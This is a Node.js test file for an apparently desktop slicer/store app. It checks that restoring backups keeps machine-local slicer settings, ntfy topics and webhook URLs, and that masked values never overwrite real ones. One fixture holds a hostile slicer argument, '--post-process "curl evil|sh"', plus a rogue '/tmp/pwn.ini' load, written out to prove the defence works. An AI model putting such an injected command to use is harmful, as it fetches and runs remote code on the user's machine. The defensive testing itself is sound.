'use strict';

/**
 * What belongs to this computer, and stays on it (maintainer's decisions,
 * 2026-09-24, SEC-011 and SEC-014). The rules live in
 * lib/store-secret-paths.js, which the Mac reads as well.
 */
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const P = require('../lib/store-secret-paths.js');
const M = require('../lib/store.js').SECRET_MASK;

test('forEachDevicePrivate visits the topic, every subscription URL and every legacy event URL', () => {
  const d = { settings: {
    ntfy: { topic: 't', token: 'x' },
    webhooks: { subscriptions: [{ url: 'a' }, { url: '' }, { url: 'b' }], events: { e1: 'c', e2: '' }, secret: 's' },
  } };
  const seen = [];
  P.forEachDevicePrivate(d, (v, set) => { seen.push(v); set('X'); });
  assert.deepEqual(seen.sort(), ['a', 'b', 'c', 't']);
  assert.equal(d.settings.ntfy.token, 'x', 'a credential is SECRET_PATHS business, not this list');
  assert.equal(d.settings.webhooks.secret, 's');
  P.forEachDevicePrivate({}, () => assert.fail('nothing to visit'));
  P.forEachDevicePrivate(null, () => assert.fail('nothing to visit'));
});

test('a restore never changes this computer\'s slicer, whatever it carries', () => {
  // SEC-014: a genuine slicer given another's arguments runs any command.
  const local = { settings: { slicer: { path: '/Applications/PrusaSlicer.app', args: '--export-gcode -o {output} {model}' },
    slicers: [{ id: 'p', path: '/Applications/PrusaSlicer.app' }], slicersAutoDetected: true } };
  const incoming = { settings: { slicer: { path: '/Users/x/Downloads/PrusaSlicer', args: '--post-process "curl evil|sh" {model}' },
    slicers: [{ id: 'evil', path: '/tmp/orca-slicer', args: '--load /tmp/pwn.ini' }], currency: 'SAR' } };
  const out = P.keepMachineLocal(local, incoming, M);
  assert.deepEqual(out.settings.slicer, local.settings.slicer);
  assert.deepEqual(out.settings.slicers, local.settings.slicers);
  assert.equal(out.settings.slicersAutoDetected, true);
  assert.equal(out.settings.currency, 'SAR', 'everything else is restored as it came');
  out.settings.slicers[0].path = 'changed';
  assert.equal(local.settings.slicers[0].path, '/Applications/PrusaSlicer.app', 'a copy, not a shared reference');
});

test('a computer with no slicer set up keeps none, rather than adopting the restored one', () => {
  const out = P.keepMachineLocal({ settings: {} }, { settings: { slicer: { path: '/x/prusa' }, slicers: [{ id: 'a' }] } }, M);
  assert.equal('slicer' in out.settings, false);
  assert.equal('slicers' in out.settings, false);
});

test('a masked topic or URL never replaces the real one; a real one is taken as it came', () => {
  const local = { settings: { ntfy: { topic: 'mine' }, webhooks: {
    subscriptions: [{ id: 's1', url: 'https://mine/1' }, { id: 's2', url: 'https://mine/2' }],
    events: { order_created: 'https://mine/e' } } } };
  const fromCloud = { settings: { ntfy: { topic: M }, webhooks: {
    subscriptions: [{ id: 's2', url: M }, { id: 's1', url: M }, { id: 'new', url: M }],
    events: { order_created: M, status_changed: M } } } };
  const out = P.keepMachineLocal(local, fromCloud, M);
  assert.equal(out.settings.ntfy.topic, 'mine');
  assert.deepEqual(out.settings.webhooks.subscriptions.map((s) => s.url), ['https://mine/2', 'https://mine/1', ''],
    'matched by id, and a mask with no counterpart is emptied, never kept as an address');
  assert.deepEqual(out.settings.webhooks.events, { order_created: 'https://mine/e', status_changed: '' });

  const fromBackup = { settings: { ntfy: { topic: 'from-backup' } } };
  assert.equal(P.keepMachineLocal(local, fromBackup, M).settings.ntfy.topic, 'from-backup');
});

test('every restore and import in the desktop goes through the rule', () => {
  const appState = fs.readFileSync(path.join(__dirname, '..', 'renderer', 'app-state.js'), 'utf8');
  const at = appState.indexOf('function replaceStoreFromSnapshot(');
  const body = appState.slice(at, appState.indexOf('\nfunction ', at + 10));
  assert.match(body, /KhaytStoreSecretPaths\.keepMachineLocal\(/);
  assert.ok(body.indexOf('keepMachineLocal') < body.indexOf('applyStoreFromSnapshot(store)'), 'applied after the store is replaced');
  for (const html of ['index.html', 'bedready.html']) {
    const src = fs.readFileSync(path.join(__dirname, '..', 'renderer', html), 'utf8');
    assert.match(src, /<script src="\.\.\/lib\/store-secret-paths\.js"><\/script>/, `${html} never loads the rule`);
  }
});

test('the desktop\'s own cloud push goes through forCloud', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'lib', 'cloud-backend.js'), 'utf8');
  assert.match(src, /crypto\.encryptStore\(forCloud\(snapshot\), getDek\(\)\)/);
});
